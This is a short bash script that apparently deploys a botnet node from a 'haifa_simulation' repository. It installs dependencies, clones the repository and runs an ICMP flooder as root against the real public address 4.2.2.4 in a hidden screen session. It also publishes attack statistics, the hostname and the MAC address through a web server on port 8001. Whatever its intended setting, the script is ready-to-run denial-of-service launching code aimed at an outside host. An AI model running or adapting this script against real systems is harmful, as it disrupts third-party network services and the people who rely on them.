#!/usr/bin/env bash

cd ~

# install dependencies
sudo apt-get update
sudo apt-get install -y git python3-pip virtualenv

# make virtualenv
virtualenv -p /usr/bin/python3 env
. env/bin/activate

# clone haifa
mkdir -p NEW_HAIFA
cd NEW_HAIFA
rm -rf haifa_simulation/
git clone https://github.com/haifa-foundation/haifa_simulation.git

# ========================================================

set -e

cd haifa_simulation/

pip install -r requirements.txt

cd botnet/

# run flooder
echo "Running flooder"
screen -d -S "haifa-flooder" -m sudo $(which python) flooder_icmp.py "4.2.2.4"

# create serve dir
mkdir -p web
test -L web/stats || ln -s $(pwd)/attack_stats.txt web/stats
cd web
cat /etc/hostname > hostname.txt
echo $(ifconfig br0-int | grep -oE 'HWaddr .*' | grep -oE ' .*' | sed 's/ //g') > mac.txt

echo "Running web-server"
screen -d -S "haifa-flood-webserver" -m bash -c "python3 -m http.server 8001"

